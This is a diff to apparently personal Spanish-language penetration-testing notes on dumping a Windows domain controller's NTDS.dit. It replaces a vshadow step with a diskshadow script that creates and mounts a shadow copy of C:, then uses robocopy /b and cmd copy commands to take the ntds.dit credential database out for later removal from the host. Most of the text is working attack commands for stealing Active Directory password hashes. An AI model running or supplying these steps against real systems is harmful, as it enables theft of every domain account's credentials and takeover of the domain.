@@ -12,10 +12,27 @@ net localgroup
 
 Si somos administradores en cualquiera de los dos casos podemos crear una copia del NTDS.dit
 
-Para esto creamos un shadow del disco en el que se encuentra instalado el AD (usualmente el C:)
-vshadow.exe -nw -p  C:
-Esto nos va  agenerar un archivo en un directorio:
-Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+Primero creamos un .txt con los comandos a correr:
+
+set context persistent nowriters
+set metadata c:\windows\temp\file.cab
+set verbose on
+begin backup
+add volume c: alias mydrive
+
+create
+
+expose %mydrive% p:
+end backup
+
+
+Luego corremos el diskshadow
+
+diskshadow /s {paht/al/txt}
+
+Copiamos el shadow a una carpeta para luego pasarnoslo
+
+robocopy /b P:\Windows\ntds\ C:\Users\Public\ ntds.dit
 
 cmd.exe /c copy \\?\Ruta_al_archivo_shadow\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 
